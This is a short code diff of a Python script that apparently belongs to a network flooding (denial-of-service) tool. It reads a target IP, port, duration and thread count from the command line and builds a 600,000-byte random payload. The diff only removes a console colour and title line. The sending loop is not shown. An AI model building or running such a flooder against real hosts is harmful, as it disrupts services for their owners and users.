@@ -6,13 +6,12 @@ import socket
 import threading
 import time
 
-os.system('color ' +random.choice(['a', 'b', 'c', 'd', 'e'])+ " & title KuryuYT")
-
 ip = sys.argv[1]
 port = sys.argv[2]
 choice = sys.argv[3]
 times = sys.argv[4]
 threads = sys.argv[5]
+
 def run():
 	data = random._urandom(600000)
 	i = random.choice(("[*]","[!]","[#]"))
